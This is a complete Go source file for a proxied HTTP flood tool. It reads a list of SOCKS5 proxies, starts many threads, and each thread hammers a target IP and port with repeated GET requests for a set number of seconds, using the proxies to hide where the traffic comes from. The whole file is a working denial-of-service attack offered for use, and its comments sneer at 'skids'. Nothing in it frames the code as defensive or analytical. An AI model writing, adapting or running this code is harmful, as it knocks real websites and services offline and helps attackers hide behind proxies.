/*
Coded by LeeOn123
Please fking code ur script by ur self, skid.

You can remove all the print for making a clean ouput.
*/

package main

import (
	"bufio"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"strconv"
	"time"

	"golang.org/x/net/proxy"
)

var (
	socks_list = make([]string, 0, 4)
	start      = make(chan bool)
)

func flood() {
	addr := os.Args[1]
	addr += ":"
	addr += os.Args[2]
	var s net.Conn
	<-start
	for {
		socks_addr := socks_list[rand.Intn(len(socks_list))]
		socks, err := proxy.SOCKS5("tcp", socks_addr, nil, proxy.Direct)
		if err != nil {
			fmt.Fprintln(os.Stderr, "Can't connect to the proxy:", err)
			continue
		}
		request := "GET / HTTP/1.1\r\nHost: " + os.Args[1] + "\r\n\r\n"
		for {
			s, err = socks.Dial("tcp", addr)
			if err != nil {
				fmt.Println("Connection Down!!!  | " + socks_addr) //for those who need share with skid
				break
			} else {
				defer s.Close()
				fmt.Println("Hitting Target From | " + socks_addr) //for those who need share with skid
				for i := 0; i < 100; i++ {
					s.Write([]byte(request))
				}
			}
			time.Sleep(time.Second * 1)
		}
	}
}

func main() {
	rand.Seed(time.Now().UnixNano())
	fmt.Println("Maybe i should run away...")
	if len(os.Args) != 6 {
		fmt.Println("Usage: ", os.Args[0], "<ip> <port> <threads> <seconds> <list>")
		os.Exit(1)
	}
	var threads, _ = strconv.Atoi(os.Args[3])
	var limit, _ = strconv.Atoi(os.Args[4])
	fi, err := os.Open(os.Args[5])
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		return
	}
	defer fi.Close()
	br := bufio.NewReader(fi)
	for {
		a, _, c := br.ReadLine()
		if c == io.EOF {
			break
		}
		socks_list = append(socks_list, string(a))
	}
	fmt.Println("Proxies numbers: " + strconv.Itoa(len(socks_list))) //for those who need share with skid
	for i := 1; i <= threads; i++ {
		time.Sleep(time.Millisecond * 1)
		go flood()                                           // Start threads
		fmt.Printf("\rThreads [%.0f] are ready", float64(i)) //for those who need share with skid
		os.Stdout.Sync()
	}
	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
	close(start)
	time.Sleep(time.Duration(limit) * time.Second)
	//Keep the threads continue
}
